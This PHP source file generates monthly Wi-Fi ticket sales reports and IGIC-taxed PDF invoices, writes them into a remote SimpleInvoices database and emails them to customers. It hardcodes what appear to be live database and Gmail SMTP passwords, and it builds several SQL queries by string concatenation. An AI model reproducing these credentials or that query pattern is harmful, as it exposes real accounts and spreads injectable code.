        case 'September':
            return 'Septiembre';
            break;
        case 'October':
            return 'Octubre';
            break;
        case 'November':
            return 'Noviembre';
            break;
        case 'December':
            return 'Diciembre';
            break;
    }
}
function secondsToTime($seconds) {
    $dtF = new \DateTime('@0');
    $dtT = new \DateTime("@$seconds");
    return $dtF->diff($dtT)->format((($seconds > 86400)?'%ad %hh%Im%Ss':'%hh%Im%Ss'));
}
/**
 * Función para añadir una línea de producto
 * @global array $suma
 * @param type $pdf
 * @param type $x
 * @param type $cantidad
 * @param type $descripcion
 * @param type $precio
 */
function cabecera($pdf, $x,$cantidad= NULL, $descripcion= NULL, $precio= NULL){
//    $x = $x + 12;
//    $pdf->SetY($x);
    if (empty($cantidad)) {
        $y = 5;
        $border = 1;
    } else {
        global $suma;
        $suma[]= $cantidad*$precio;
        $y = 8;
        $border = 'LR';
    }
//    $pdf->Line(10,$x,200,$x);
    $pdf->Cell(35, ((empty($cantidad))?5:10), ((!empty($cantidad))? number_format($cantidad, 2,',','.'):'CANTIDAD'), $border,0, 'C');
    $pdf->Cell(90, ((empty($cantidad))?5:10), ((!empty($cantidad))?  utf8_decode($descripcion):utf8_decode('DESCRIPCIÓN')), $border,0, 'C');
    $pdf->Cell(35, ((empty($cantidad))?5:10), ((!empty($cantidad))?  number_format($precio, 2,',','.').  chr(128):'PRECIO'), $border,0, 'C');
    $pdf->Cell(35, ((empty($cantidad))?5:10), ((!empty($cantidad))?  number_format($cantidad*$precio, 2,',','.').  chr(128):'TOTAL'), $border,1, 'C');
}
/**
 * Cierra la linea de productos y saca el subtotal
 * @global array $suma
 * @param type $pdf
 * @param type $x
 * @param type $concepto
 * @return type - Devuelve el subtotal para calcular el total
 */
function subtotal($pdf, $concepto) {
    global $suma;
    $x = $pdf->GetY();
    $pdf->Line(10, $x, 205, $x);
    $pdf->SetX(135);
    $pdf->Cell(35, 10, "Subtotal $concepto", 'R',0, 'C');
    $pdf->Cell(35,10,  number_format(array_sum($suma), 2,',','.').chr(128),1, 1, 'C');
    $subtotal = array_sum($suma);
    $suma = array();
    return $subtotal;
}

function cierreinforme($pdf, $total, $comision) {
    $subtotal1 = (((isset($total['PayPal']))?$total['Tickets'] + $total['PayPal']:$total['Tickets']) - $total['Gastos'])*($comision/100);
    $subtotal = $subtotal1 + $total['Gastos'];
    $sinigic = (($subtotal*100)/107);
    $x = $pdf->GetY();
    $x+=12;
    $pdf->SetY($x);
    $pdf->Cell(35, 5, 'IGIC %', 1,0, 'C');
    $pdf->Cell(35, 5, '7%', 1,0, 'C');
    
    $pdf->SetX(100);
    $pdf->Cell(35, 5, 'Subtotal', 0,0, 'R');
    $pdf->Cell(35, 5, ' ', 1,0, 'C');
    $pdf->Cell(35, 5, number_format(((isset($total['PayPal']))?$total['Tickets'] + $total['PayPal']:$total['Tickets']), 2,',','.').chr(128), 1,1, 'C');
    
    
    $pdf->Cell(35, 5, 'Total sin IGIC', 1,0, 'C');
    $pdf->Cell(35, 5, number_format($sinigic, 2,',','.').chr(128), 1,0, 'C');
    
    $pdf->SetX(100);
    $pdf->Cell(35, 5, 'Gastos', 0,0, 'R');
    $pdf->Cell(35, 5, ' ', 1,0, 'C');
    $pdf->Cell(35, 5, number_format($total['Gastos'], 2,',','.').chr(128), 1,1, 'C');
    
    
    
    $pdf->Cell(35, 5, 'IGIC', 1,0, 'C');
    $pdf->Cell(35, 5, number_format($sinigic*0.07, 2,',','.').chr(128), 1,0, 'C');
    
    $pdf->SetX(100);
    $pdf->Cell(35, 5, '% Comision', 0,0, 'R');
    $pdf->Cell(35, 5, "$comision%", 1,0, 'C');
    $pdf->Cell(35, 5, number_format($subtotal1, 2,',','.').  chr(128), 1,1, 'C');
    
    
    $pdf->Cell(35, 5, 'TOTAL', 1,0, 'C');
    $pdf->Cell(35, 5, number_format($subtotal, 2,',','.').chr(128), 1,0, 'C');
    
    $pdf->SetX(135);
    $pdf->Cell(35, 5, 'TOTAL A FACTURAR', 0,0, 'R');
    $pdf->Cell(35, 5, number_format($subtotal, 2,',','.').chr(128), 1,1, 'C');
    
    if (isset($total['PayPal'])) {
        $pdf->SetX(135);
        $pdf->Cell(35, 5, 'LIQUIDACION', 0,0, 'R');
        $pdf->Cell(35, 5, number_format(($subtotal - $total['PayPal']), 2,',','.').chr(128), 1,1, 'C');
    }
        
    return $subtotal;
}
/**
 * $in => Se pasa los usuarios para el informe en el formato array("id_lote" => array("cantidad" => X, "usuarios" => array("usuariox"), "precio"=>X))
 * $local => es la linea de la base de datos del hotspot
 * $print => sacar el fichero por pantalla en vez de guardarlo como fichero
 * $mes => se le pasa el mes a figurar en la cabecera
 * $users => modo de informe. 0 => no salen relación de usuarios, 1 => usuarios anulados, 2 => todos los usuarios.
 */
function pdf($in, $local, $print = false, $mes = FALSE, $users = FALSE, $informe=FALSE) {
    global $fulldomain;
    require getcwd().'/scripts/fpdf/fpdf.php';
    global $suma;
    global $database;
    $suma= array();
    $totalfin = array();
    $pdf = new FPDF();
    $pdf->AddPage('P', 'A4');
    $pdf->SetFont('Arial', 'I', 14);
    $pdf->SetTextColor(0);
    $pdf->Image("http://servibyte.net/images/logo.png", 110, 12, 80, 32);
    $x = 12;
    $pdf->SetY($x);
    $pdf->Write(0, 'Desglose Ventas Wi-Fi');
    $x = $x+12;
    $pdf->SetY($x);
    $pdf->Write(0, "Local: ".$local['ServerName']);
    $x = $x+12;
    $pdf->SetY($x);
    $pdf->Write(0, 'Mes: '.  (($mes)?$mes:spanish(date('F', strtotime('-1 month')))));
    $x = $x+12;
    $pdf->SetY($x);
    //Cambiar año
    $pdf->Write(0, utf8_decode('Año: ').  date('Y'));
    $pdf->SetFont('Arial', 'B', 12);
    $x = $x+12;
    $pdf->SetY($x);
    $gastos = $database->query("SELECT * FROM `gastos` WHERE `hotspot`=".$local['id']);
    if ($gastos->num_rows > 0) {
        cabecera($pdf, $x);
        while ($each = $gastos->fetch_assoc()) {
            cabecera($pdf, $x, $each['cantidad'], $each['Descripcion'], $each['precio']);
        }
        $totalfin['Gastos'] = subtotal($pdf, 'Gastos');
    } else {
        $totalfin['Gastos'] = 0;
    }
    cabecera($pdf, $x);
    foreach ($in as $key => $value) {
        $lote = $database->query("SELECT perfiles.Descripcion FROM lotes INNER JOIN perfiles ON perfiles.id = lotes.Id_perfil WHERE lotes.id = $key");
        $duracion = $lote->fetch_assoc();
        //checkear el indice del array para ver si usar el id del ticket para sacar la duracion.
        //cabecera($pdf, $x, $value['cantidad'], "Ticket ".(($value['precio']==5)?'1 Dia':(($value['precio']==10)?'3 Dias':'1 Semana')), $value['precio']);
        if (!strstr($duracion['Descripcion'], "PAYPAL")) cabecera($pdf, $x, $value['cantidad'], $duracion['Descripcion'], $value['precio']);
    }
    $totalfin['Tickets'] = subtotal($pdf, 'Tickets');
    $paypal = false;
    foreach ($in as $key => $value) {
        $lote = $database->query("SELECT perfiles.Descripcion FROM lotes INNER JOIN perfiles ON perfiles.id = lotes.Id_perfil WHERE lotes.id = $key");
        $duracion = $lote->fetch_assoc();
        //checkear el indice del array para ver si usar el id del ticket para sacar la duracion.
        //cabecera($pdf, $x, $value['cantidad'], "Ticket ".(($value['precio']==5)?'1 Dia':(($value['precio']==10)?'3 Dias':'1 Semana')), $value['precio']);
        if (strstr($duracion['Descripcion'], "PAYPAL")) {
            cabecera($pdf, $x, $value['cantidad'], $duracion['Descripcion'], $value['precio']);
            $paypal = true;
        }
    }
    if ($paypal) $totalfin['PayPal'] = subtotal($pdf, 'PayPal');
    if (!$informe) $factura = cierreinforme($pdf, $totalfin, 50);
    $out = array();
    foreach ($in as $key => $value) {
        if ($value['cantidad'] !=  count($value['usuarios'])) {
            foreach ($value['usuarios'] as $item) {
                if (strstr($item, ' ')) {
                    $lote = $database->query("SELECT perfiles.Descripcion FROM lotes INNER JOIN perfiles ON perfiles.id = lotes.Id_perfil WHERE lotes.id = $key");
                    $duracion = $lote->fetch_assoc();
                    $out[]= strstr($item, ' ', TRUE)." -  ".$duracion['Descripcion'];
                }
            }
        }
    }
    // Si hay q poner los usuarios cancelados $users a 1, si tambíen hay q poner los creados hay q poner users a 2
    if ($users) {
        $pdf->Cell(30,5," ",0,1,'L');
        if (count($out) > 0) {
            $pdf->Cell(30,5,utf8_decode('Relación de Tickets Anulados:'),0,1,'L');
            $pdf->SetX(30);
            $counter = 0;
            foreach ($out as $value) {
                //$pdf->Cell(30,5,$value,0,1,'L');
                $pdf->Cell(30,5,$value,0,((($counter%3) == 0)?1:0),'L');
                if (($counter%5) == 0) $pdf->SetX(30);
            }
        }
        if ($users == 2) {
            $pdf->Cell(30,5," ",0,1,'L');
            $pdf->Cell(30,5,utf8_decode('Relación Usuarios:'),0,1,'L');
            foreach ($in as $key => $value) {
                $lote = $database->query("SELECT perfiles.Descripcion FROM lotes INNER JOIN perfiles ON perfiles.id = lotes.Id_perfil WHERE lotes.id = $key");
                $duracion = $lote->fetch_assoc();
                $pdf->Cell(30,5,utf8_decode($duracion['Descripcion']),0,1,'L');
                $counter = 0;
                $pdf->SetX(30);
                foreach ($value['usuarios'] as $aux) {
                    if (!strstr($aux, "ANULADO")) {
                        $counter++;
                        $pdf->Cell(30,5,$aux,0,((($counter%5) == 0)?1:0),'L');
                        if (($counter%5) == 0) $pdf->SetX(30);
                    } 
                }
                $pdf->Cell(30,5," ",0,1,'L');
            }
        }
    }
        
    if ($print) {
        $pdf->Output();
    } else {
        $pdf->Output($local['ServerName']." ".spanish(date('F')).".pdf",'F');
        return array($local['ServerName']." ".spanish(date('F')).".pdf", $factura,$local);
    } 
}
function simplefactura($pdf) {
    $mysqli = new mysqli('217.125.25.165', 'servibyte', 'sbyte_15_Mxz', 'simpleinvoices', 8092); 
    if ($mysqli->query("INSERT INTO `si_invoices`(`index_id` ,`biller_id`, `customer_id`, `type_id`, `preference_id`, `date`)  SELECT MAX(`index_id`)+1 ,'1', '".$pdf[2]['si']."', '2', '1', NOW() FROM `si_invoices`")) {
        if ($mysqli->query("INSERT INTO `si_invoice_items`(`invoice_id`, `quantity`, `product_id`, `unit_price`, `tax_amount`, `gross_total`, `description`, `total`) SELECT MAX(`index_id`) ,1,3,".number_format((($pdf[1]*100)/107), 2,'.','.').",".number_format((($pdf[1]*100)/107)*0.07, 2,'.','.').",".number_format((($pdf[1]*100)/107), 2,'.','.').",'Mes de ".spanish(date('F'))."',".number_format($pdf[1], 2,'.','.')." FROM `si_invoices`")) {
            if ($mysqli->query("INSERT INTO `si_invoice_item_tax`(`invoice_item_id`, `tax_id`, `tax_type`, `tax_rate`, `tax_amount`) SELECT MAX(`id`) ,1,'%',7,".number_format((($pdf[1]*100)/107)*0.07, 2,'.','.')." FROM `si_invoice_items`")) {
                $ok = file_get_contents('http://217.125.25.165:8091/access.php?info=a');
                if ($ok == 'done') {
                    $result = $mysqli->query("SELECT MAX(`index_id`) as idd FROM `si_invoices`");
                    $id = $result->fetch_assoc();
                    $get=file_get_contents('http://217.125.25.165:8091/index.php?module=export&view=invoice&id='.$id['idd'].'&format=pdf');
                    file_put_contents('Factura '.$pdf[0], $get);
                    file_get_contents('http://217.125.25.165:8091/access.php?info=c');
                    return $pdf;
                }
            }
        }
    }
}
function enviaemail($pdf) {
    global $fulldomain;
    require 'scripts/phpmailer/PHPMailerAutoload.php';
    $mysqli = new mysqli('217.125.25.165', 'servibyte', 'sbyte_15_Mxz', 'simpleinvoices', 8092); 
    $result = $mysqli->query("SELECT * FROM `si_customers` WHERE `id`=".$pdf[2]['si']);
    $aux = $result->fetch_assoc();
    $mail = new PHPMailer;
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = TRUE;
    $mail->Port = 465;
    $mail->SMTPSecure='ssl';
    $mail->Username = 'no-reply@servibyte.com';
    $mail->Password = 'e3b7ep2K2';
    $mail->SetLanguage('es', 'scripts/phpmailer/phpmailer.lang-es.php');
    $mail->From = 'no-reply@servibyte.com';
    $mail->FromName = 'Servibyte.com';
    $mail->AddAddress($aux['email'], utf8_decode($aux['name']));
    $mail->IsHTML();
    $mail->Subject = utf8_decode('Factura e Informe del mes '.spanish(date('F')));
    $mail->addAttachment($fulldomain.'/'.$pdf[0]);
    $mail->addAttachment($fulldomain.'/Factura '.$pdf[0]);
    $mail->msgHTML(utf8_decode('Estimado cliente, le enviamos la factura y el informe de consumo de este mes.'));
    $mail->send();
}
function historial($total, $hotspot) {
    global $database;
    $sql="INSERT INTO `historial`(`id_hotspot`, `fecha`";
    $value="($hotspot, NOW()";
    $count = 1;
    foreach ($total as $key => $item) {
        $sql.=", `id_perfil$count`, `contador_perfil$count`, `users_$count`";
        $value.=", $key, ".$item['cantidad'].", '".  implode(',', $item['usuario'])."'";
        $count++;
    } 
    $database->query($sql.") VALUE $value)");
}
/*--------------------------------------------------------------------------*
 *                                 END                                      *
 *--------------------------------------------------------------------------*/
?>

